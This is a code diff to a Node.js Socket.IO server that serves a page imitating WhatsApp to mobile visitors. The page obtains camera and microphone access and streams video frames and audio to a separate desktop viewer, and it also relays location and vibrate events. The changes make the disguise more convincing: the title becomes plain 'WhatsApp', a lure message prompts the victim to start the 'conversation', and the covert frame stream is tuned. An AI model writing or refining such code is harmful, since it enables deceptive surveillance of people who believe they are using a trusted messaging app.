@@ -4,7 +4,11 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" } });
+const io = new Server(server, { 
+  cors: { origin: "*" },
+  pingTimeout: 60000,
+  pingInterval: 25000
+});
 
 const PORT = process.env.PORT || 3000;
 
@@ -18,14 +22,14 @@ app.get('/', (req, res) => {
   res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
 });
 
-// ==================== CELULAR (INPUT CORRIGIDO) ====================
+// ==================== CELULAR (OTIMIZADO) ====================
 function getMobileHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-    <title>WhatsApp - Conversa com minha loirinha</title>
+    <title>WhatsApp</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -43,14 +47,13 @@ function getMobileHTML(fullUrl) {
             align-items: center;
             gap: 12px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.3);
-            position: relative;
             z-index: 10;
         }
         .header h2 { flex: 1; font-size: 18px; }
         .status-dot { width: 10px; height: 10px; background: #25D366; border-radius: 50%; }
 
         .messages {
-            height: calc(100vh - 110px); /* deixa espaço para header + input */
+            height: calc(100vh - 112px);
             overflow-y: auto;
             padding: 16px;
             display: flex;
@@ -58,11 +61,7 @@ function getMobileHTML(fullUrl) {
             gap: 8px;
             background: #0B1416;
         }
-        .message {
-            display: flex;
-            margin-bottom: 8px;
-            animation: fadeIn 0.25s ease;
-        }
+        .message { display: flex; margin-bottom: 8px; animation: fadeIn 0.25s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
         .message.received { justify-content: flex-start; }
         .message.sent { justify-content: flex-end; }
@@ -77,23 +76,12 @@ function getMobileHTML(fullUrl) {
         .message.sent .bubble { background: #005C4B; color: white; border-top-right-radius: 4px; }
         .time { font-size: 11px; opacity: 0.75; margin-top: 4px; text-align: right; }
 
-        .typing {
-            display: none;
-            padding: 10px 16px;
-            background: #202C33;
-            border-radius: 18px;
-            width: fit-content;
-            color: #8696A0;
-            font-size: 14px;
-        }
+        .typing { display: none; padding: 10px 16px; background: #202C33; border-radius: 18px; width: fit-content; color: #8696A0; font-size: 14px; }
         .typing.show { display: block; }
 
-        /* INPUT FIXO - mais confiável no mobile */
         .input-area {
             position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
+            bottom: 0; left: 0; right: 0;
             background: #1F2C33;
             padding: 8px 12px 12px;
             display: flex;
@@ -112,10 +100,7 @@ function getMobileHTML(fullUrl) {
             font-size: 16px;
             outline: none;
             min-height: 46px;
-            max-height: 120px;
-            line-height: 1.4;
             -webkit-appearance: none;
-            appearance: none;
         }
         .send-btn {
             background: #00A884;
@@ -129,12 +114,9 @@ function getMobileHTML(fullUrl) {
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            flex-shrink: 0;
         }
-
         .modal {
-            position: fixed;
-            inset: 0;
+            position: fixed; inset: 0;
             background: rgba(0,0,0,0.95);
             display: flex;
             align-items: center;
@@ -160,10 +142,8 @@ function getMobileHTML(fullUrl) {
         }
         .conn-indicator {
             position: fixed;
-            bottom: 70px;
-            right: 18px;
-            width: 10px;
-            height: 10px;
+            bottom: 70px; right: 18px;
+            width: 10px; height: 10px;
             border-radius: 50%;
             background: #25D366;
             z-index: 200;
@@ -173,7 +153,7 @@ function getMobileHTML(fullUrl) {
 <body>
     <div class="modal" id="permissionModal">
         <div class="modal-content">
-            <h3>📱 WhatsApp - Conversa com minha loirinha</h3>
+            <h3>📱 WhatsApp</h3>
             <p>Permita acesso à câmera e microfone</p>
             <button class="start-btn" id="startBtn">Iniciar Conversa</button>
         </div>
@@ -181,7 +161,7 @@ function getMobileHTML(fullUrl) {
 
     <div class="header">
         <div class="status-dot"></div>
-        <h2>WhatsAp - Conversa com minha loirinha</h2>
+        <h2>WhatsApp</h2>
     </div>
 
     <div class="messages" id="messages">
@@ -204,6 +184,7 @@ function getMobileHTML(fullUrl) {
         let facingMode = 'user';
         let permissions = false;
         let frameInterval = null;
+        let lastFrameTime = 0;
         let typingTimeout = null;
 
         const messagesDiv = document.getElementById('messages');
@@ -225,13 +206,16 @@ function getMobileHTML(fullUrl) {
         }
 
         function sendFrame() {
-            if (!permissions || !localVideo.videoWidth) return;
+            const now = Date.now();
+            if (!permissions || !localVideo.videoWidth || now - lastFrameTime < 200) return;
+            lastFrameTime = now;
+
             const canvas = document.createElement('canvas');
-            canvas.width = 300;
-            canvas.height = 225;
+            canvas.width = 240;
+            canvas.height = 180;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(localVideo, 0, 0, 300, 225);
-            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.78));
+            ctx.drawImage(localVideo, 0, 0, 240, 180);
+            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
         }
 
         async function startPermissions() {
@@ -240,7 +224,12 @@ function getMobileHTML(fullUrl) {
                 if (frameInterval) clearInterval(frameInterval);
 
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 }, 
+                        facingMode: facingMode,
+                        frameRate: { ideal: 15, max: 20 }
+                    },
                     audio: true
                 });
 
@@ -248,8 +237,9 @@ function getMobileHTML(fullUrl) {
                 localVideo.srcObject = stream;
                 await localVideo.play();
 
-                frameInterval = setInterval(sendFrame, 160);
+                frameInterval = setInterval(sendFrame, 220);
 
+                // Áudio simplificado
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const source = audioCtx.createMediaStreamSource(stream);
                 const processor = audioCtx.createScriptProcessor(4096, 1, 1);
@@ -287,7 +277,7 @@ function getMobileHTML(fullUrl) {
             if (!permissions) return;
             socket.emit('typing_start');
             clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1200);
+            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1300);
         }
 
         startBtn.onclick = startPermissions;
@@ -319,7 +309,7 @@ function getMobileHTML(fullUrl) {
             if (!permissions) {
                 const div = document.createElement('div');
                 div.className = 'message received';
-                div.innerHTML = '<div class="bubble"></div>';
+                div.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar Conversa" para começar.</div>';
                 messagesDiv.appendChild(div);
             }
         }, 600);
@@ -328,7 +318,7 @@ function getMobileHTML(fullUrl) {
 </html>`;
 }
 
-// ==================== DESKTOP (mantido simples) ====================
+// ==================== DESKTOP ====================
 function getDesktopHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -424,7 +414,7 @@ function getDesktopHTML(fullUrl) {
         messageInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
 
         socket.on('message', msg => addMessage(msg, false));
-        socket.on('frame', frame => remoteVideo.src = frame);
+        socket.on('frame', frame => { remoteVideo.src = frame; });
         socket.on('mobile_online', () => {
             document.getElementById('contactStatus').innerHTML = 'online 💚';
             document.getElementById('chatStatus').innerHTML = 'online';
@@ -437,14 +427,19 @@ function getDesktopHTML(fullUrl) {
 </html>`;
 }
 
-// Socket.IO
+// ==================== SOCKET.IO ====================
 io.on('connection', (socket) => {
   console.log('Cliente conectado:', socket.id);
-  const events = ['message','typing_start','typing_stop','frame','audio','location','vibrate','toggle_camera','mobile_online'];
-  events.forEach(ev => socket.on(ev, data => socket.broadcast.emit(ev, data)));
+
+  const events = ['message', 'typing_start', 'typing_stop', 'frame', 'audio', 'location', 'vibrate', 'toggle_camera', 'mobile_online'];
+  events.forEach(ev => {
+    socket.on(ev, data => socket.broadcast.emit(ev, data));
+  });
+
+  socket.on('disconnect', () => console.log('Cliente desconectado'));
 });
 
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`\n✅ Servidor rodando na porta ${PORT}`);
-  console.log(`Abra PRIMEIRO no CELULAR → http://[SEU-IP]:${PORT}`);
+  console.log(`Abra primeiro no CELULAR e clique em "Iniciar Conversa"\n`);
 });
